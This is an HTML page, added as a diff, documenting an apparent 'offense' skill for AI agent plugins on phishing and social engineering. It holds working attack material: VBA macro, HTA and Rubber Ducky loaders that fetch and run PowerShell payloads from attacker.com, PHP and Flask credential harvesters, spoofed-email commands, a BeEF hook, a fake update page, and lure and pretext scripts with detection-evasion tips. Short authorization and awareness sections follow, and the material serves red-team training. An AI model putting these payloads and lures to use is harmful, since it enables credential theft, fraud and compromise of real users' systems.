@@ -1,0 +1,433 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>performing-social-engineering — SecSkills</title><link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9B%A1%EF%B8%8F%3C/text%3E%3C/svg%3E"><link rel="stylesheet" href="style.css"><style>
+    .shead{padding:56px 0 34px}
+    .crumb{font-family:var(--mono);font-size:12.5px;color:var(--muted);margin-bottom:20px}
+    .crumb a{color:var(--muted)}
+    h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
+    .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
+    .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
+    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
+    .inst .p{color:var(--faint);user-select:none}
+    article{padding:44px 0 72px;border-top:1px solid var(--border)}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
+    article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
+    article p{margin:0 0 15px;max-width:74ch}
+    article ul,article ol{margin:0 0 16px;padding-left:22px;max-width:74ch}
+    article li{margin:5px 0}article li>ul{margin:5px 0}
+    article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
+    article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
+    article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
+    .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
+    article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    </style></head><body>
+<div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
+<nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
+<button class="tbtn" id="tbtn" aria-label="Toggle theme">theme</button></div></div>
+<header class="shead"><div class="wrap">
+  <div class="crumb"><a href="index.html">secskills</a> / offense / performing-social-engineering</div>
+  <h1 class="sk">performing-social-engineering</h1>
+  <div class="stags">
+    <span><span class="dot dot-offense"></span> offense</span>
+    <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
+  </div>
+  <p class="sdesc">Conduct phishing campaigns, credential harvesting, pretexting, and social engineering attacks using tools like Gophish, SET, and custom techniques. Use when performing social engineering assessments or red team engagements.</p>
+  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+<span class="p">$ </span>/plugin install secskills-core</div>
+</div></header>
+<article><div class="wrap"><h2>When to Use</h2>
+<ul>
+<li>Phishing campaign execution</li>
+<li>Credential harvesting operations</li>
+<li>Social engineering assessments</li>
+<li>Red team engagements</li>
+<li>Security awareness testing</li>
+</ul>
+<h2>When NOT to Use</h2>
+<ul>
+<li><strong>Any campaign without written authorization and a defined scope</strong> — stop</li>
+<li><strong>Technical exploitation after a click</strong> — use the relevant post-exploitation skill</li>
+<li><strong>Analyzing a phishing email you received</strong> — use <a class="xref" href="analyzing-phishing-emails.html"><code>analyzing-phishing-emails</code></a></li>
+</ul>
+<p>(headers, links, attachments); <a class="xref" href="analyzing-malware.html"><code>analyzing-malware</code></a> for a detonated payload</p>
+<h2>Phishing Infrastructure</h2>
+<h3>Gophish (Phishing Framework)</h3>
+<pre><code># Install
+wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
+unzip gophish-v0.12.1-linux-64bit.zip
+chmod +x gophish
+./gophish
+
+# Access web interface
+https://localhost:3333
+# Default: admin:gophish</code></pre>
+<p><strong>Gophish Campaign Setup:</strong></p>
+<ol>
+<li><strong>Email Templates</strong> - Create convincing phishing emails</li>
+<li><strong>Landing Pages</strong> - Clone legitimate sites for credential harvesting</li>
+<li><strong>Sending Profiles</strong> - Configure SMTP server</li>
+<li><strong>Groups</strong> - Import target user lists</li>
+<li><strong>Campaign</strong> - Combine all elements and launch</li>
+</ol>
+<h3>SET (Social Engineering Toolkit)</h3>
+<pre><code># Launch SET
+setoolkit
+
+# Common modules:
+# 1) Social-Engineering Attacks
+#    1) Spear-Phishing Attack Vectors
+#    2) Website Attack Vectors
+#    3) Credential Harvester Attack Method</code></pre>
+<p><strong>Credential Harvester:</strong></p>
+<pre><code># SET Menu:
+# 1 -&gt; 2 -&gt; 3 (Credential Harvester)
+# Choose site template or custom URL
+# Enter attacker IP
+# Hosts fake login page
+# Captures credentials when submitted</code></pre>
+<h2>Email Phishing</h2>
+<h3>Email Spoofing</h3>
+<pre><code># sendEmail (simple SMTP client)
+sendEmail -f ceo@company.com \
+  -t target@company.com \
+  -u "Urgent: Password Reset Required" \
+  -m "Click here to reset: http://evil.com/reset" \
+  -s smtp.server.com:25
+
+# swaks (SMTP testing tool)
+swaks --to target@company.com \
+  --from ceo@company.com \
+  --header "Subject: Important Update" \
+  --body "Please review: http://evil.com" \
+  --server smtp.company.com</code></pre>
+<h3>Attachment-Based Phishing</h3>
+<p><strong>Malicious Office Macros:</strong></p>
+<pre><code>' Excel/Word VBA macro
+Sub AutoOpen()
+    Shell "powershell -nop -w hidden -c ""IEX((new-object net.webclient).downloadstring('http://attacker.com/payload.ps1'))"""
+End Sub</code></pre>
+<p><strong>Malicious PDF:</strong></p>
+<pre><code># Create PDF with embedded JavaScript
+# Use tools like:
+# - metasploit (exploit/windows/fileformat/adobe_pdf_embedded_exe)
+# - PDFtk
+# - malicious JavaScript injection</code></pre>
+<p><strong>Malicious HTA:</strong></p>
+<pre><code>&lt;!-- malicious.hta --&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;script language="VBScript"&gt;
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
+window.close()
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;/html&gt;</code></pre>
+<h3>Clone Legitimate Sites</h3>
+<pre><code># HTTrack website copier
+httrack http://legitimate-site.com -O ./cloned_site/
+
+# wget mirror
+wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://legitimate-site.com
+
+# Manual with curl
+curl -o index.html http://legitimate-site.com/login
+
+# Modify form action to send credentials to attacker
+&lt;form action="http://attacker.com/harvest.php" method="POST"&gt;</code></pre>
+<h3>Credential Harvesting Server</h3>
+<p><strong>Simple PHP Harvester:</strong></p>
+<pre><code>&lt;?php
+// harvest.php
+$file = 'credentials.txt';
+$username = $_POST['username'];
+$password = $_POST['password'];
+$data = "User: $username | Pass: $password | IP: " . $_SERVER['REMOTE_ADDR'] . " | " . date('Y-m-d H:i:s') . "\n";
+file_put_contents($file, $data, FILE_APPEND);
+
+// Redirect to real site
+header('Location: https://real-site.com');
+?&gt;</code></pre>
+<p><strong>Python Flask Harvester:</strong></p>
+<pre><code>from flask import Flask, request, redirect
+app = Flask(__name__)
+
+@app.route('/login', methods=['POST'])
+def harvest():
+    with open('creds.txt', 'a') as f:
+        f.write(f"User: {request.form['username']}, Pass: {request.form['password']}\n")
+    return redirect('https://real-site.com')
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=80)</code></pre>
+<h2>Voice Phishing (Vishing)</h2>
+<h3>SpoofCard/Caller ID Spoofing</h3>
+<ul>
+<li>Services to spoof caller ID</li>
+<li>Impersonate IT support, executives, vendors</li>
+<li>Social engineering over phone</li>
+</ul>
+<p><strong>Common Pretexts:</strong></p>
+<ul>
+<li>IT support needing to verify credentials</li>
+<li>HR department verifying personal information</li>
+<li>Finance department confirming wire transfer</li>
+<li>Vendor requiring payment information update</li>
+</ul>
+<h2>SMS Phishing (Smishing)</h2>
+<pre><code># Send SMS with link
+# Use services or tools like:
+# - Twilio API
+# - SMS gateways
+# - SIM card with AT commands
+
+# Example pretext:
+"Your package delivery failed. Track here: http://evil.com/track"
+"Your account has been locked. Reset here: http://evil.com/unlock"
+"You've won a prize! Claim here: http://evil.com/claim"</code></pre>
+<h2>USB Drop Attacks</h2>
+<h3>Rubber Ducky / Bad USB</h3>
+<p><strong>Ducky Script Example:</strong></p>
+<pre><code>REM Open PowerShell and download payload
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 1000
+STRING IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
+ENTER</code></pre>
+<p><strong>Bash Bunny:</strong></p>
+<pre><code># Payloads at /payloads/switch1/
+# Example: exfiltrate files, run payload, etc.</code></pre>
+<h3>Physical USB Drops</h3>
+<p><strong>Pretexts:</strong></p>
+<ul>
+<li>"Company Financial Data 2024"</li>
+<li>"Salary Information - Confidential"</li>
+<li>"Employee Bonuses Q4"</li>
+<li>"IT Security Update - Required"</li>
+</ul>
+<p><strong>Payload Ideas:</strong></p>
+<ul>
+<li>Reverse shell</li>
+<li>Credential stealer</li>
+<li>Keylogger</li>
+<li>Data exfiltration</li>
+<li>Persistence mechanisms</li>
+</ul>
+<h2>QR Code Phishing</h2>
+<pre><code># Generate QR code pointing to phishing site
+qrencode -o evil_qr.png "http://evil.com/harvest"
+
+# Print and place in physical locations:
+# - "Scan for Free WiFi"
+# - "Employee Portal Access"
+# - "Building Directory"</code></pre>
+<h2>Watering Hole Attacks</h2>
+<ol>
+<li><strong>Identify</strong> target organization's commonly visited sites</li>
+<li><strong>Compromise</strong> the website (or create lookalike)</li>
+<li><strong>Inject</strong> malicious code (exploit or profiling)</li>
+<li><strong>Wait</strong> for targets to visit and get compromised</li>
+</ol>
+<h2>Browser-Based Attacks</h2>
+<h3>BeEF (Browser Exploitation Framework)</h3>
+<pre><code># Start BeEF
+./beef
+
+# Hook browsers with:
+&lt;script src="http://attacker-ip:3000/hook.js"&gt;&lt;/script&gt;
+
+# Access UI
+http://127.0.0.1:3000/ui/panel
+# Default: beef:beef
+
+# Commands:
+# - Social Engineering (fake notifications)
+# - Browser exploitation
+# - Network discovery
+# - Credential harvesting</code></pre>
+<h3>Fake Update Pages</h3>
+<pre><code>&lt;!-- fake-update.html --&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Critical Browser Update Required&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Your browser is out of date!&lt;/h1&gt;
+&lt;p&gt;Click here to download the latest security update.&lt;/p&gt;
+&lt;a href="http://attacker.com/malware.exe"&gt;Download Update&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<h2>Pretexting Scenarios</h2>
+<p><strong>IT Support:</strong></p>
+<ul>
+<li>"Hi, this is John from IT. We're doing routine password resets..."</li>
+<li>"We've detected suspicious activity on your account..."</li>
+<li>"Your VPN certificate is expiring, we need to update it..."</li>
+</ul>
+<p><strong>Executive Impersonation:</strong></p>
+<ul>
+<li>"This is [CEO name], I'm in a meeting and need you to..."</li>
+<li>"Urgent: Wire transfer needed before end of day..."</li>
+<li>"I'm traveling and can't access my account, can you help me..."</li>
+</ul>
+<p><strong>Vendor/Partner:</strong></p>
+<ul>
+<li>"This is accounting from [vendor]. We need to update payment information..."</li>
+<li>"Your invoice is past due, please update billing details..."</li>
+</ul>
+<p><strong>Delivery/Shipping:</strong></p>
+<ul>
+<li>"Package delivery failed, verify address..."</li>
+<li>"Customs clearance required, pay fee at..."</li>
+</ul>
+<h2>LinkedIn/Social Media Reconnaissance</h2>
+<pre><code># Gather employee information
+# - Job titles
+# - Organizational structure
+# - Technologies used
+# - Recent activities/projects
+
+# Tools:
+# - theHarvester
+# - linkedin2username
+# - hunter.io (email patterns)
+
+# Use for:
+# - Targeted phishing
+# - Pretexting scenarios
+# - Impersonation attacks</code></pre>
+<h2>Payload Delivery Methods</h2>
+<p><strong>Links:</strong></p>
+<ul>
+<li>Shortened URLs (bit.ly, tinyurl)</li>
+<li>Typosquatting domains</li>
+<li>Homograph attacks (IDN homograph)</li>
+<li>URL obfuscation</li>
+</ul>
+<p><strong>Attachments:</strong></p>
+<ul>
+<li>Office documents with macros (.docm, .xlsm)</li>
+<li>PDFs with exploits/JavaScript</li>
+<li>Compressed files (.zip, .rar)</li>
+<li>ISO/IMG files</li>
+<li>LNK files (shortcut tricks)</li>
+</ul>
+<p><strong>Advanced:</strong></p>
+<ul>
+<li>HTML smuggling</li>
+<li>Polyglot files</li>
+<li>Password-protected archives (bypass AV)</li>
+<li>Signed malware (stolen/fake certificates)</li>
+</ul>
+<h2>Tracking and Reporting</h2>
+<p><strong>Email Tracking:</strong></p>
+<pre><code>&lt;!-- Invisible tracking pixel --&gt;
+&lt;img src="http://attacker.com/track?id=USER123" width="1" height="1" style="display:none"&gt;</code></pre>
+<p><strong>Link Tracking:</strong></p>
+<pre><code># Unique URL per target
+http://attacker.com/click?id=USER123
+
+# Log access in server</code></pre>
+<p><strong>Metrics to Track:</strong></p>
+<ul>
+<li>Emails sent</li>
+<li>Emails opened (tracking pixel)</li>
+<li>Links clicked</li>
+<li>Credentials submitted</li>
+<li>Attachments opened</li>
+<li>Time to first click/submission</li>
+</ul>
+<h2>OpSec Considerations</h2>
+<p><strong>Infrastructure:</strong></p>
+<ul>
+<li>Use disposable domains</li>
+<li>HTTPS for credential harvesting</li>
+<li>Legitimate SSL certificates (Let's Encrypt)</li>
+<li>Categorize domains (submit to categorization services)</li>
+<li>CDN for hosting (CloudFlare)</li>
+</ul>
+<p><strong>Email:</strong></p>
+<ul>
+<li>SPF/DKIM/DMARC alignment</li>
+<li>Warm up email reputation</li>
+<li>Similar but different domains (company.com vs company-portal.com)</li>
+<li>Avoid spam trigger words</li>
+</ul>
+<p><strong>Detection Avoidance:</strong></p>
+<ul>
+<li>Realistic sender names and addresses</li>
+<li>Professional email content</li>
+<li>Avoid known malicious indicators</li>
+<li>Time-based delivery (business hours)</li>
+<li>Geofencing (target geography only)</li>
+</ul>
+<h2>Tools Summary</h2>
+<ul>
+<li><strong>Gophish</strong> - Phishing campaign management</li>
+<li><strong>SET</strong> - Social Engineering Toolkit</li>
+<li><strong>BeEF</strong> - Browser exploitation</li>
+<li><strong>King Phisher</strong> - Phishing campaign toolkit</li>
+<li><strong>Evilginx2</strong> - MITM phishing proxy (bypass 2FA)</li>
+<li><strong>Modlishka</strong> - Reverse proxy phishing</li>
+<li><strong>CredSniper</strong> - 2FA token capture</li>
+<li><strong>ShellPhish</strong> - Automated phishing</li>
+</ul>
+<h2>Defensive Awareness</h2>
+<p>Teach users to recognize:</p>
+<ul>
+<li>Urgency/pressure tactics</li>
+<li>Requests for credentials</li>
+<li>Unusual senders</li>
+<li>Suspicious links/attachments</li>
+<li>Too-good-to-be-true offers</li>
+<li>Requests to bypass security</li>
+</ul>
+<h2>Legal and Ethical Considerations</h2>
+<ul>
+<li><strong>Always have written authorization</strong></li>
+<li>Define scope clearly</li>
+<li>Protect harvested data</li>
+<li>Follow ROE (Rules of Engagement)</li>
+<li>Report findings responsibly</li>
+<li>Delete data after engagement</li>
+</ul>
+<h2>ATT&amp;CK Coverage</h2>
+<p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
+<p><strong>Reconnaissance</strong> (TA0043)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1589/">T1589</a> Gather Victim Identity Information — see also <a class="xref" href="performing-reconnaissance.html"><code>performing-reconnaissance</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1591/">T1591</a> Gather Victim Org Information — see also <a class="xref" href="performing-reconnaissance.html"><code>performing-reconnaissance</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1598/">T1598</a> Phishing for Information — see also <a class="xref" href="analyzing-phishing-emails.html"><code>analyzing-phishing-emails</code></a></li>
+</ul>
+<p><strong>Resource Development</strong> (TA0042)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1583/">T1583</a> Acquire Infrastructure</li>
+<li><a href="https://attack.mitre.org/techniques/T1585/">T1585</a> Establish Accounts</li>
+<li><a href="https://attack.mitre.org/techniques/T1608/">T1608</a> Stage Capabilities — see also <a class="xref" href="transferring-files.html"><code>transferring-files</code></a></li>
+</ul>
+<p><strong>Initial Access</strong> (TA0001)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1189/">T1189</a> Drive-by Compromise</li>
+<li><a href="https://attack.mitre.org/techniques/T1566/">T1566</a> Phishing — see also <a class="xref" href="analyzing-phishing-emails.html"><code>analyzing-phishing-emails</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1566/001/">T1566.001</a> Spearphishing Attachment — see also <a class="xref" href="analyzing-malware.html"><code>analyzing-malware</code></a>, <a class="xref" href="analyzing-phishing-emails.html"><code>analyzing-phishing-emails</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1566/002/">T1566.002</a> Spearphishing Link — see also <a class="xref" href="analyzing-phishing-emails.html"><code>analyzing-phishing-emails</code></a></li>
+</ul>
+<p><strong>Execution</strong> (TA0002)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1203/">T1203</a> Exploitation for Client Execution — see also <a class="xref" href="analyzing-malware.html"><code>analyzing-malware</code></a></li>
+<li><a href="https://attack.mitre.org/techniques/T1204/">T1204</a> User Execution</li>
+</ul>
+<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
+<h2>References</h2>
+<ul>
+<li>https://book.hacktricks.xyz/generic-methodologies-and-resources/phishing-methodology</li>
+<li>https://getgophish.com/</li>
+<li>https://github.com/trustedsec/social-engineer-toolkit</li>
+<li>https://www.social-engineer.org/</li>
+</ul></div></article>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
